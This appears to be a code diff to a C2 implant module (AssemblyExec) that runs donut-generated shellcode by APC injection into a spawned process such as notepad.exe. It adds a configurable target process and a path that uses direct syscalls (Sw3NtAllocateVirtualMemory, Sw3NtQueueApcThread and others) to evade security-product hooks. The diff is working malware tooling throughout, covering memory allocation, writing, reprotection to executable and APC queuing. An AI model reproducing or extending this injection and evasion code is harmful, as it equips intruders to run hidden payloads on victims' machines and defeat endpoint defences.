@@ -19,6 +19,8 @@
 #elif _WIN32
 #include <io.h>
 #include <fcntl.h>
+
+#include <syscall.hpp>
 #endif
 
 #define BUFSIZE 2048
@@ -56,6 +58,8 @@ AssemblyExec::AssemblyExec()
 	: ModuleCmd("", moduleHash)
 #endif
 {
+	m_processToSpawn="";
+	m_useSyscall=false;
 }
 
 AssemblyExec::~AssemblyExec()
@@ -209,6 +213,9 @@ int AssemblyExec::initConfig(const nlohmann::json &config)
 	{
 		if(it.key()=="process")
 			m_processToSpawn = it.value();
+		else if(it.key()=="syscall")
+			m_useSyscall = true;
+			
 	}
 
 	return 0;
@@ -309,6 +316,8 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 	bool isInjectIntoNewProcess=true;
 	std::string processToSpawn="notepad.exe";
+	if(!m_processToSpawn.empty())
+		processToSpawn=m_processToSpawn;
 
 	// if we create a process we need to exite process with donut shellcode
 	if(isInjectIntoNewProcess)
@@ -399,6 +408,7 @@ int AssemblyExec::createNewProcess(const std::string& payload, const std::string
 	{
         return -1;
     }
+	
     // Create the child process. 
     PROCESS_INFORMATION piProcInfo; 
     STARTUPINFO siStartInfo;
@@ -427,13 +437,35 @@ int AssemblyExec::createNewProcess(const std::string& payload, const std::string
 		return -1;
     }
 
-	PVOID remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-	WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
-	DWORD oldprotect = 0;
-	VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
-	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
-	QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
-	ResumeThread(piProcInfo.hThread);
+	PVOID remoteBuffer;
+	if(m_useSyscall)
+	{
+		// https://github.com/0xrob/XOR-Shellcode-QueueUserAPC-Syscall/blob/main/queueUserAPC-XOR/Source.cpp
+		SIZE_T sizeToAlloc = payload.size();
+
+		Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+		Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
+		
+		ULONG oldAccess;
+		Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
+
+		Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, NULL, NULL);
+		Sw3NtResumeThread_(piProcInfo.hThread, NULL);
+	}
+	else
+	{
+		remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+
+		WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
+
+		DWORD oldprotect = 0;
+		VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
+
+		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
+		QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
+		ResumeThread(piProcInfo.hThread);
+	}
 
 	m_isProcessRuning=true;
 	m_processHandle = piProcInfo.hProcess;
